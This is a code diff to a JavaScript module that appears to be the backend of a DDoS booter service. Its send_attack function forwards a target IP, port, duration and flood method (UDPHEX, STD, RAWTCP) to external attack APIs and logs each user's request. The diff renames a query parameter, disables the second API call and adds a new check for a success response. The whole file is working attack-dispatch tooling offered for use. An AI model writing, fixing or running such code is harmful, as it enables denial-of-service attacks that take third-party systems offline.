@@ -131,13 +131,13 @@ exports.send_attack = async function(ip, port, time, method, usr) {
     this.log_action(usr, ip, port, time, method);
     let response = "";
     
-    let rreturn = await(await fetch(Config.API_1 + ip + "&port=" + port + "&time=" + time + "&type=" + method)).text();
+    let rreturn = await(await fetch(Config.API_1 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
     console.log(rreturn);
     response += "API 1: " + await eExtra.get_api_response(rreturn) + "\r\n";
     
-    let rreturn1 = await(await fetch(Config.API_2 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
-    console.log(rreturn1);
-    response += "API 1: " + await eExtra.get_api_response(rreturn1) + "\r\n";
+    // let rreturn1 = await(await fetch(Config.API_2 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    // console.log(rreturn1);
+    // response += "API 2: " + await eExtra.get_api_response(rreturn1) + "\r\n";
 
     return response;
 }
@@ -148,7 +148,7 @@ exports.send_attack = async function(ip, port, time, method, usr) {
 */
 exports.get_api_response = function(rpn) {
     let new_res = rpn.toLowerCase();
-    if(new_res.includes("attack sent") || new_res.includes("udphex") || new_res.includes("std") || new_res.includes("rawtcp") || new_res.includes("attack initalized")) {
+    if(new_res.includes("attack sent") || new_res.includes("udphex") || new_res.includes("std") || new_res.includes("rawtcp") || new_res.includes("attack initalized") || new_res.includes('"status":"success"')) {
         return "Attack Sent";
     } else if(new_res.includes("invalid key") || new_res.includes("key is invalid")) {
         return "Error, Invalid Key";
